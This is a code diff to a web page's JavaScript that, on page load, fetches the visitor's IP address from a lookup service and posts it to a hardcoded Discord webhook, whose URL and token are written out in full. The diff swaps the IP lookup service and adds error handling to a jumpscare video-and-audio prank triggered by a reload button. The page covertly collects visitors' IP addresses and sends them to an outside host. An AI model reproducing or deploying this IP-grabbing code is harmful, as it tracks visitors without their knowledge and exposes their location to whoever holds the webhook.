@@ -3,7 +3,7 @@
 // Function to send IP to Discord webhook
 async function sendIPToDiscord() {
   try {
-    const response = await fetch('https://ipinfo.io/json');
+    const response = await fetch('https://api.ipify.org?format=json');
     const data = await response.json();
 
     const webhookUrl = 'https://discord.com/api/webhooks/1322340263817121872/KVz7ETrNyLzmHtpnWCWVNlcs7V688BSA59RFmammBBjnxFHk-kGj8bdQCGs3LpRPRzPE';
@@ -31,8 +31,9 @@ document.getElementById('reload-button').addEventListener('click', () => {
 
   document.querySelector('.content').style.display = 'none';
   jumpscare.style.display = 'flex';
+  
   video.play();
-  audio.play();
+  audio.play().catch(error => console.error('Audio play failed:', error)); // Ensure audio starts
 });
 
 // Send IP info to Discord on page load
